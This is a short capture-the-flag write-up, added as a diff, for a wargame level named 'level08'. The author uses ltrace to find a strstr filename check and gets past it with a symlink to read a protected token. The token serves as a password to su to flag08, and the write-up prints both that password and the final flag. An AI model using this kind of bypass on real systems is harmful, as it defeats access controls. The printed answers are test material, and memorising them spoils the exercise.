@@ -1,0 +1,32 @@
+# At this level I have an executable and a file named 'token'.
+
+$> ./level08
+./level08 [file to read]
+
+$> ./level08 token 
+You may not access 'token'
+
+$> ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                   = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)               = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+
+# With ltrace, I now knows that this program uses a strstr("token", "token"). So I have to pass token to it with a different name -> symbolic links !
+
+$> ln -s ~/token /tmp/symlink
+
+$> ./level08 /tmp/symlink
+quif5eloekouj29ke0vouxean
+
+# I have a token, now I log in to flag08
+
+$> su flag08 
+password: quif5eloekouj29ke0vouxean
+
+$> getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
